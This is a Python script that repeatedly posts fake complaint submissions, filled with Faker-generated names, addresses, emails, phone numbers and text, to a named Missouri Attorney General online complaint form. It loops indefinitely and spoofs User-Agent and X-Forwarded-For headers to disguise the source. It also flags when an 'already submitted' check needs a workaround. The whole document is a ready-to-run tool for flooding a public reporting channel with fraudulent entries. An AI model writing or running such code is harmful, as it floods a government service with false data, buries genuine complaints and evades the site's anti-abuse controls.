import requests
import json
import sys
import time
from faker import Faker

fake = Faker()
url = "https://ago.mo.gov/file-a-complaint/transgender-center-concerns?sf_cntrl_id=ctl00$MainContent$C001"

while True:
    data = {"TextFieldController_4": fake.first_name(),
            "TextFieldController_5": fake.last_name(),
            "TextFieldController_1": fake.street_address(),
            "TextFieldController_2": fake.city(),
            "DropdownListFieldController": fake.state_abbr(),
            "TextFieldController_6": fake.postcode(),
            "TextFieldController_0": fake.free_email(),
            "TextFieldController_3": fake.phone_number(),
            "ParagraphTextFieldController": fake.paragraph(10)}

    data_json = json.dumps(data)
    headers = {"Content-Type": "application/json",
               "User-Agent": fake.user_agent(),
               "X-Forwarded-For": fake.ipv4(),
               "Cookie": ""}

    response = requests.post(url, data=data_json, headers=headers)
    if not response.ok:
        print("Endpoint failed {0}".format(response.status_code))
        sys.exit(1)
    elif "already submitted" in response.text:
        print("Form already submitted, workaround required")
        sys.exit(1)

    print("Response submitted for {0}, {1}".format( data["TextFieldController_5"],
                                                    data["TextFieldController_4"] ))

    time.sleep(1)
